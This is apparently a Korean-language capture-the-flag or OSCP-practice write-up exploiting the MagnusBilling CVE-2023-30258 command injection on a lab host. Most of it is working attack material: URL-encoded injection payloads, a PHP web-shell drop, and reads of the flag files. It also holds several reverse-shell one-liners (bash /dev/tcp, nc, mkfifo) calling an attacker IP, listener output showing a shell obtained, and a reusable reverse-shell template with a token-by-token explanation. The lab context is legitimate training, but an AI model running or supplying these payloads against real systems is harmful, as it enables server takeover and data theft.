# OSCP 침투 테스트 이뉴머레이션 정리

hint: https://github.com/MarkLee131/awesome-web-pocs/blob/main/CVE-2023-30258.md

## 🎯 타겟 시스템 정보
- **IP**: 10.10.13.178
- **OS**: Linux (Debian 기반)

## 📡 1단계: 초기 포트 스캔 및 서비스 발견

### Nmap 스캔 결과
```bash
nmap -Pn -sC -sV -oN scan.txt -p- 10.10.13.178
```

**발견된 서비스:**
| 포트 | 서비스 | 버전 | 상태 |
|------|--------|------|------|
| 22   | SSH    | OpenSSH 9.2p1 Debian | 열림 |
| 80   | HTTP   | Apache 2.4.62 | 열림 |
| 3306 | MySQL  | MariaDB | 열림 (인증 필요) |
| 5038 | Asterisk | Call Manager 2.10.6 | 열림 |

**핵심 발견사항:**
- `/mbilling/` 디렉토리가 robots.txt에서 발견됨
- HTTP 서비스가 자동으로 `/mbilling/`로 리다이렉트됨

## 🔍 2단계: 서비스별 이뉴머레이션

### A. HTTP 서비스 (포트 80) - MagnusBilling 발견
```bash
# 웹 서버 확인
curl -s http://10.10.13.178/mbilling/ | grep -i version
```

**발견된 애플리케이션**: MagnusBilling (VoIP 빌링 시스템)

### B. Asterisk Call Manager (포트 5038)
```bash
# Asterisk 서비스 연결 테스트
nc -nv 10.10.13.178 5038
```

**연결 결과:**
- Asterisk Call Manager/2.10.6 실행 중
- 기본 크리덴셜 시도: admin/admin → 인증 실패

**사용한 netcat 옵션:**
- `-n`: DNS 조회 비활성화 (속도 향상)
- `-v`: verbose 모드 (연결 상태 출력)

## 🔎 3단계: 취약점 조사

### Asterisk 취약점 검색
```bash
searchsploit Asterisk
```
**결과**: 다수의 DoS 취약점 발견되었으나 원격 코드 실행 취약점은 제한적

### MagnusBilling 취약점 검색
```bash
searchsploit magnus
```
**🚨 중요 발견**: CVE-2023-30258 - Command Injection 취약점
- **파일**: `/usr/share/exploitdb/exploits/multiple/webapps/52170.txt`
- **영향 버전**: MagnusBilling 7.3.0
- **취약점 유형**: 명령어 주입 (Command Injection)

## 💥 4단계: 발견된 취약점 분석

### CVE-2023-30258 상세 정보
**취약한 엔드포인트:**
```
/lib/icepay/icepay.php?democ=<payload>
```

**PoC (Proof of Concept):**
```bash
# 기본 명령어 주입 테스트
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=zzz.php;"
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=zzz.php%3Becho%20%27<?php%20system(%24_GET%5B%22cmd%22%5D);%20?>%27%20%3E%20zzz.php"

# %3B는 세미콜론(;)의 URL 인코딩
# 세미콜론으로 명령어를 체인화하여 추가 명령 실행 가능
```

## 🚫 현재 직면한 문제들

1. **연결 문제**: 일부 curl/gobuster 명령에서 연결 거부 발생
   - 방화벽 또는 서비스 다운타임 가능성

2. **디렉토리 이뉴머레이션 실패**: gobuster 실행 중 연결 오류

## 🎯 다음 단계 액션 플랜

#### 1. 연결 상태 재확인
```bash
# 포트 상태 재확인
nmap -p 80,22,3306,5038 10.10.13.178
```

#### 2. 웹 서비스 접근성 테스트
```bash
# 웹 서버 응답 확인
curl -I http://10.10.13.178/
curl -I http://10.10.13.178/mbilling/

# robots.txt 내용 확인
curl http://10.10.13.178/robots.txt
```

#### 3. Command Injection 취약점 테스트
```bash
# 5초 지연되면 명령어가 실행된 것
time curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bsleep%205"
# 결과를 웹에서 접근 가능한 위치에 저장
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami%20%3E%20/var/www/html/mbilling/result.txt"

# 저장된 결과 확인
curl "http://10.10.13.178/mbilling/result.txt"

# 1단계: 기본 명령어 실행 테스트
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami"

# 2단계: 시스템 정보 수집
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bid"
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Buname%20-a"

# 3단계: 파일 시스템 탐색
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bls%20-la"
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bpwd"
```

#### 4. 리버스 쉘 시도
```bash
# 리스너 설정
nc -lvnp 4444
l: listen
v: verbose mode
n: numeric-only IP addresses
p: port number

# 리버스 쉘 시도
# %3B => ;    # 명령 구분
# %20 => 공백 # 스페이스
# %27 => '    # 작은따옴표
# %3E => >    # stdout
# %26 => &    # stderr 포함
# %2F => /    # 경로 구분
# %30 => 0    # stdin
# %31 => 1    # stdout
# %32 => 2    # stderr
# %3C => <    # stdin

# 디코딩
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test;bash -c 'bash -i >& /dev/tcp/10.8.136.212/4444 0>&1'"
# 인코딩
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.8.136.212/4444%200%3E%261%27"
# bash 사용 시 ambiguous redirect 에러 발생 원인 파악중
┌──(root㉿docker-desktop)-[/]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.136.212] from (UNKNOWN) [10.10.13.178] 59270
bash: line 1: 1.txt: ambiguous redirect

# 리스너 먼저 시작
nc -lvnp 4444
# 단순
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test;bash -c 'bash -i 2>&1 | nc 10.8.136.212 4444'"
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%202%3E%261%20%7C%20nc%2010.8.136.212%204444%27"
# 더 안정적인
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.136.212 4444 > /tmp/f"
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Brm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%2010.8.136.212%204444%20%3E/tmp/f"

# 리버스 쉘 시도 2차 -> 연결은 되나 에러
─(root㉿docker-desktop)-[/tmp]
└─# nc -lvvnp 4444
listening on [any] 4444 ...
connect to [10.8.136.212] from (UNKNOWN) [10.10.13.178] 38228
/bin/sh: 0: can't access tty; job control turned off
$ 


#### 5. 추가 이뉴머레이션
```bash
# 디렉토리 브루트포싱 재시도
gobuster dir -u http://10.10.13.178/mbilling/ -w /usr/share/wordlists/dirb/common.txt

# 설정 파일 접근 시도
curl http://10.10.13.178/mbilling/config/config.conf.php
curl http://10.10.13.178/mbilling/config/
```


#### MySQL 서비스 조사
```bash
# MySQL 연결 시도
apt instsall maria-client
mysql -h 10.10.13.178 -u root -p
mysql -h 10.10.13.178 -u admin -p
```


# 취약점 정보
cat /usr/share/exploitdb/exploits/multiple/webapps/52170.txt
# Exploit Title: MagnusSolution magnusbilling 7.3.0 - Command Injection
# Date: 2024-10-26
# Exploit Author: CodeSecLab
# Vendor Homepage: https://github.com/magnussolution/magnusbilling7
# Software Link: https://github.com/magnussolution/magnusbilling7
# Version: 7.3.0
# Tested on: Centos
# CVE : CVE-2023-30258


# PoC URL for Command Injection

http://magnusbilling/lib/icepay/icepay.php?democ=testfile; id > /tmp/injected.txt


curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami%20%3E%20/var/www/html/mbilling/real_test.txt"
curl "http://10.10.13.178/mbilling/real_test.txt"

nc -lvnp 4444  # 터미널 1
# 터미널 2에서:
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.8.136.212/4444%200%3E%261%27"


## 커맨드 인젝션 -> 직접적인 인젝션을 해도 원격지에서 실행이 되므로 내가 확인은 불가능 -> 파일로 저장되게 한 후 -> http 로 접근해서 웹에서 확인하기

TARGET='http://10.10.13.178/mbilling/lib/icepay/icepay.php'

# Payload 생성
# /var/www/html/는 Apache, Nginx 등 웹서버가 기본으로 사용하는 디렉토리이므로 접근하기 쉽도록 설정
# id
payload=";id > /var/www/html/mbilling/lib/id"
# find user.txt
payload=";find / -name user.txt > /var/www/html/mbilling/lib/find_user"
# user.txt
payload=";cat /home/magnus/user.txt > /var/www/html/mbilling/lib/ss"
# find root.txt
payload=";find / -name root.txt > /var/www/html/mbilling/lib/find_root"
# suid 파일 찾기
payload=";find / -perm -4000 -type f > /var/www/html/mbilling/lib/suid 2>/var/www/html/mbilling/lib/suid_err"

# URL 인코딩 처리
encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")
# 디코딩 처리 확인
echo -n "${encoded_payload}" | python3 -c "import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read()))"
# 결과 확인

curl --get --data-urlencode "payload=;cat /home/magnus/user.txt > /var/www/html/mbilling/lib/ss" "$TARGET"

http http://10.10.13.178/mbilling/lib/


┌──(root㉿docker-desktop)-[/]
└─# http http://10.10.13.178/mbilling/lib/sangwoo.txt
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Length: 60
Content-Type: text/plain
Date: Sun, 01 Jun 2025 11:57:24 GMT
ETag: "3c-6368156c3084c"
Keep-Alive: timeout=5, max=100
Last-Modified: Sun, 01 Jun 2025 11:56:34 GMT
Server: Apache/2.4.62 (Debian)

uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)




┌──(root㉿docker-desktop)-[/]
└─# 
# 이후 결과 확인
http http://10.10.13.178/mbilling/lib/user.txt
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Length: 38
Content-Type: text/plain
Date: Sun, 01 Jun 2025 12:31:58 GMT
ETag: "26-63681d52221c2"
Keep-Alive: timeout=5, max=100
Last-Modified: Sun, 01 Jun 2025 12:31:54 GMT
Server: Apache/2.4.62 (Debian)

THM{4a6831d5f124b25eefb1e92e0f0da4ca}



# 리버스쉘 2차 시도 성공
nc -lvnp 443
curl 'http://10.10.13.178/mbilling/lib/icepay/icepay.php' \
 --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.136.212 443 >/tmp/f;'


---

## ✅ 2차 시도 리버스 셸 명령어 (성공한 버전)

```bash
curl 'http://10.10.13.178/mbilling/lib/icepay/icepay.php' \
 --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.136.212 443 >/tmp/f;'
```

---

## ❌ 1차 시도 실패 원인 분석

1차 시도 예시 (실패):

```bash
curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test;bash -c 'bash -i >& /dev/tcp/10.8.136.212/4444 0>&1'"
```

### 🔎 주요 문제점 분석

| 원인                                   | 설명                                                                                                   |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------- |
| `bash -c` 내부의 리디렉션 구문 (`>&`, `0>&1`) | Bash는 이중 리디렉션에서 **인용 오류**, 또는 `ambiguous redirect`가 발생하기 쉽습니다. 특히, 웹에서 인젝션될 때는 `>`나 `&`가 제대로 해석되지 않음 |
| 작은따옴표 (`'`) 포함                       | URL 인코딩이 불완전하면 서버에서 구문 파싱 오류 발생 가능                                                                   |
| 단일 파이프라인 방식                          | 네트워크 지연이나 세션 종료 시 취약                                                                                 |
| 일부 웹쉘에서는 `bash` 명령이 제한되거나 `sh`만 허용됨  | `sh`는 내장 기능이 적지만 더 호환성 높음                                                                            |

결론적으로 **복잡한 리디렉션 구조와 bash 의존** 때문에 파싱 오류가 발생하거나 명령이 실행되지 않았을 수 있습니다.

---

## ✅ 2차 시도 명령어 완전 분석 (성공한 이유 포함)

```bash
democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.136.212 443 >/tmp/f;
```

### 🧠 토큰별 분석

| 토큰              | 설명                             |                           |
| --------------- | ------------------------------ | ------------------------- |
| `;`             | 앞의 파라미터(`democ=`) 종료 후 명령어 주입  |                           |
| `rm /tmp/f`     | 이전에 생성된 FIFO 파일 제거 (중복 방지)     |                           |
| `mkfifo /tmp/f` | FIFO(named pipe) 파일 생성         |                           |
| `cat /tmp/f`    | 해당 FIFO에서 입력 기다림               |                           |
| \`              | sh -i\`                        | FIFO에서 읽은 내용을 인터랙티브 셸로 전달 |
| `2>&1`          | 표준 에러를 표준 출력으로 리디렉션            |                           |
| \`              | nc 10.8.136.212 443\`          | `sh -i` 출력을 공격자에게 보냄      |
| `> /tmp/f`      | 공격자 입력을 다시 FIFO로 연결 (입력 루프 완성) |                           |
| `;`             | 명령어 체인 종료                      |                           |

---

## ✅ 성공한 이유

| 이유                  | 설명                                            |
| ------------------- | --------------------------------------------- |
| **단일 셸 (`sh`) 사용**  | `bash -c` 대신 `sh`를 직접 사용하여 복잡한 파싱 없이 명령 실행    |
| **FIFO 파이프 방식**     | 전통적인 안정적 리버스 셸 방식. 입력/출력을 분리하여 세션이 안정적        |
| **명확한 리디렉션**        | `2>&1`, `>`, 파이프가 명확하게 사용되어 ambiguity가 없음     |
| **작은따옴표 없음**        | `'bash -i'` 같이 shell 내부 구문 문제가 없음             |
| **URL 인코딩 올바르게 적용** | `--data-urlencode`를 사용해 명령 전체가 올바르게 인코딩되어 전송됨 |

---

## 🛡 정리: 리버스 쉘 성공 조건

| 요소              | 설명                          |
| --------------- | --------------------------- |
| **명령어 간결화**     | `sh` 사용으로 복잡도 최소화           |
| **URL 인코딩 철저히** | 파라미터 내 특수 문자 안전 처리 필요       |
| **파이프/FIFO 활용** | 입력-출력 연결 구조 명확              |
| **bash 의존 최소화** | bash는 일부 시스템에서 사용 불가하거나 제한됨 |

---

## ✅ 수동 쉘 명령 템플릿 (OSCP용)

```bash
TARGET="http://10.10.13.178/mbilling/lib/icepay/icepay.php"
LHOST="10.8.136.212"
LPORT=443

PAYLOAD=";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $LHOST $LPORT >/tmp/f;"
curl -s "$TARGET" --get --data-urlencode "democ=$PAYLOAD"
```

---

필요하시면 이후 `privilege escalation`, `MySQL credential reuse`, `Asterisk exploit`, `SUID 바이너리 분석` 등 다음 단계도 정리해드릴 수 있습니다.
